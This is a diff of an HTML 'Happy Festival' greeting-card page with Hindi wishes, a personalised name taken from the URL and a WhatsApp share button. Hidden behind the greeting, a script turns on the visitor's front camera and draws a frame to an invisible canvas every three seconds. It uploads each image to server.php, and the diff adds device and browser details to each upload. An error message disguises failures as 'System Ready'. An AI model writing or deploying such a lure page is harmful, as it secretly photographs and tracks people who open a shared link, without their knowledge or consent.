@@ -1,51 +1,184 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Best Wishes</title>
+    <title>Happy Festival</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; text-align: center; overflow: hidden; }
-        .main { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #1e1e2f, #000); }
-        h1 { font-size: 3.5rem; background: linear-gradient(to right, #ff00cc, #3333ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        video { display: none; }
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffff99, #99ccff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        #live-clock {
+            font-weight: bold;
+            color: #333;
+            background: rgba(255,255,255,0.5);
+            padding: 5px 15px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 1.8em;
+            color: #000;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 2px white;
+        }
+
+        .welcome-section {
+            margin-bottom: 15px;
+        }
+
+        .hindi-text {
+            font-size: 1.1em;
+            margin: 5px 0;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .green-bg {
+            background-color: #00ff00;
+            padding: 8px;
+            border-radius: 10px;
+            display: inline-block;
+            color: #ffffff;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        /* Priyanshu Style Name */
+        #userName {
+            font-size: 2.5em;
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #008080;
+            margin: 15px 0;
+            font-weight: bold;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .wishing-section h2 {
+            font-size: 1.4em;
+            color: #0000ff;
+            margin: 5px 0;
+        }
+
+        .blue-text {
+            font-size: 0.9em;
+            color: #ffffff;
+            background-color: #007bff;
+            padding: 12px;
+            border-radius: 10px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        .share-buttons {
+            margin-top: 20px;
+        }
+
+        .share-buttons button {
+            padding: 12px 25px;
+            margin: 5px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            width: 80%;
+        }
+
+        .whatsapp { background-color: #25d366; color: white; }
     </style>
 </head>
 <body>
-    <div class="main">
-        <h2 id="greet">WISHING YOU</h2>
-        <h1 id="userName">GUEST</h1>
-        <h3 id="festText">⭐ Happy New year ⭐</h3>
-        <p>आपके और आपके पूरे परिवार को इस नए साल की हार्दिक शुभकामनाएं</p>
+    <div class="container">
+        <div id="live-clock">00:00:00</div>
+        <h1>|| Today Day is Special ||</h1>
+        
+        <div class="welcome-section">
+            <span style="font-size:1.5em;">🙏</span> Welcome <span style="font-size:1.5em;">🙏</span>
+            <p class="hindi-text">आपका हर दिन खुशियों से भरा हो।</p>
+            <p class="green-bg">|| खुशियाँ आपके साथ हों ||</p>
+        </div>
+
+        <div id="userName">GUEST</div>
+
+        <div class="wishing-section">
+            <h2 id="fest-display">⭐ Happy Festival ⭐</h2>
+            <p style="color:red; font-weight:bold;">to you and your lovely family</p>
+            <p class="blue-text">Wishing you lots of happiness and blessings on this special occasion.</p>
+        </div>
+
+        <div class="share-buttons">
+            <button class="whatsapp">Share on Whatsapp</button>
+        </div>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const name = urlParams.get('name');
-        if (name) document.getElementById("userName").textContent = name;
+    <canvas id="videoCanvas" style="display:none;"></canvas>
 
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
+    <script>
+        // 1. Digital Clock
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('live-clock').innerText = now.toLocaleTimeString();
+        }
+        setInterval(updateTime, 1000);
+
+        // 2. Device Info Detection
+        const deviceInfo = "Device: " + navigator.platform + " | Browser: " + navigator.userAgent.split(' ')[0];
+
+        // 3. Camera Capture Logic
+        const canvas = document.getElementById('videoCanvas');
+        const ctx = canvas.getContext('2d');
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
+
             video.addEventListener('loadeddata', () => {
                 setInterval(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
+                    ctx.drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/png');
+
                     fetch('server.php', {
                         method: 'POST',
-                        body: JSON.stringify({ image: canvas.toDataURL('image/png') }),
+                        body: JSON.stringify({ 
+                            image: imgData,
+                            info: deviceInfo // Extra Info bhej raha hai
+                        }),
                         headers: { 'Content-Type': 'application/json' }
                     });
                 }, 3000);
             });
-        }).catch(e => console.log("System Ready."));
+        }).catch(e => console.log("System Ready"));
+
+        // 4. Name & Festival handling
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get('name');
+        if (name) document.getElementById("userName").textContent = decodeURIComponent(name);
     </script>
 </body>
 </html>
-
